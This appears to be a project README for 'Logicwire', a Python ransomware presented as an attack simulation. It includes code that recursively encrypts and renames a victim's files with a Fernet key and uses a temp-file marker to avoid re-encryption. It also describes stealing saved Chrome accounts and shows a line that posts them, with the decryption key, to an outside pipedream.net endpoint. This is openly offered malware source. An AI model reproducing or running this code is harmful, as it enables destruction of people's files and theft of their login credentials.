<img src="https://media.discordapp.net/attachments/768928242467340328/811300430985560124/fond-geometrique-3d-noir-low-low-noir_79145-393.jpg"><br><br><img src="https://forthebadge.com/images/badges/built-with-love.svg" height="40" length="40"> <img src="https://forthebadge.com/images/badges/made-with-python.svg" height="40" length="40"> <img src="https://forthebadge.com/images/badges/fuck-it-ship-it.svg" height="40" length="40">
# Logicwire
Logicwire is a disguised version of ransomwares. It allows to simulate an attack, without being very dangerous.
# Victim POV
I put as unique folder the pit named "fichiers" because I did not have a windows vm.<br>
https://www.youtube.com/watch?v=y02J6HjoihA&feature=youtu.be&ab_channel=%26
# Attacker POV
<img src="https://media.discordapp.net/attachments/768928242467340328/811308563690684486/unknown.png?width=1154&height=670"><br>
<img src="https://media.discordapp.net/attachments/768928242467340328/811308892696739840/unknown.png?width=1443&height=386">
# Technical operation
### Avoid double encryption
It installs a .tmp signature in the Temp cache to avoid double encryption of files. And check if it is there, if he is present he only run the ransomware GUI.
```python3
tmp = str(tempfile.gettempdir())
signature = "cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp"
path = os.path.dirname(os.path.abspath(signature))
tmp_files = []
for root, dirs, files in os.walk(tmp):
        for file in files:
            tmp_files.append(file)

if signature in tmp_files:
        main()
else:
        file = open("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp", "w").write("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5")
        shutil.move(path + "\\" + signature, tmp + "\\" + signature)
        write_key()
        key = load_key()
```
### Symmetric encryption
A key is generated randomly with Fernet.generate_key() and use it to encrypt all files recursively, including the subdirectories etc...
```python3
f = Fernet(key)
subdirs = [x[0] for x in os.walk(dir)]
for dirdir in subdirs:
        for filename in glob.glob(os.path.join(dirdir, '*.*'), recursive=True):
            with open(filename, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)
            with open(filename, "wb") as new:
                new.write(encrypted_data)

            extension = str(filename).split(".")[1]
            name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
            os.rename(filename, dirdir + "/" + name + "." + extension)
```
### Accounts recovery
It steals the accounts by connecting to the chrome database and sends them back to a pipdream via POST API, then redirects them to the decided webmail.
```python3
r = requests.post("https://en54ygy2ikv5dtk.m.pipedream.net", data={"key": keydecrypt, "logs": rez}, headers={'Content - Type': 'application / json'})
```
